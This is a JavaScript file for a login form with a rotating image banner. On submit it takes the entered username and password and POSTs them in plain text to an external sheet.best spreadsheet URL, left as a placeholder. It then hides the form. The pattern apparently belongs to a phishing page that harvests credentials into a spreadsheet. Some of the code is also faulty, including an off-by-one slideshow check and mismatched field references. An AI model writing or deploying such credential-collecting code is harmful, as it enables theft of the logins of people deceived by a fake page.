let images = document.getElementById('images');
let arry = ['contenido1', 'contenido2', 'contenido3'];
let i = 0;
const formulario = document.getElementById('formulario');


formulario.addEventListener('submit', (e) => {
    e.preventDefault();

    let usuario = document.querySelector('#usr').value;
    let contrasena = document.querySelector('#passwrd').value;

    if (!usuario || !contrasena) {
        console.log('Usuario o contraseña incorrectos')
    }
    else {

        fetch('<< ---- YOUR SHEET.BEST API KEY CONNECTION URL ---- >>', {
            method: 'POST',
            mode: 'cors',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                "User": formulario.usuario.value,
                "Password": formulario.contrasena.value
            })
        });
        
        document.querySelector('.datos1').style.display = "none";
        document.querySelector('.datos1-2').classList.add('displayblock');

    }
})

function changeImages() {
    images.classList.add(arry[i]);
    setTimeout(next, 3000);
}

function next() {
    i++;
    if(i > arry.length){
        i = 0;
        images.classList.remove('contenido2');
        images.classList.remove('contenido3');
    }
    setTimeout(changeImages, 3000);
}


changeImages()